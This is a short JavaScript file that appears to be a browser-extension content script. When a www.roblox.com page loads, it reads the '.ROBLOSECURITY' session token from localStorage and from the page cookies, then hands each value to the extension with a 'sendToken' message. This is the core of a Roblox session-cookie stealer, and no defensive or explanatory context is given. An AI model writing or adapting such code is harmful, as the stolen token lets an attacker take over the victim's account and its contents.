window.addEventListener('load', function() {
  if (window.location.hostname === 'www.roblox.com') {
    const token = localStorage.getItem('.ROBLOSECURITY');

    if (token) {
      chrome.runtime.sendMessage({
        action: "sendToken",
        token: token
      });
    }

    const cookies = document.cookie.split(';');
    for (let cookie of cookies) {
      if (cookie.trim().startsWith('.ROBLOSECURITY=')) {
        const token = cookie.split('=')[1];
        chrome.runtime.sendMessage({
          action: "sendToken",
          token: token
        });
        break;
      }
    }
  }
});
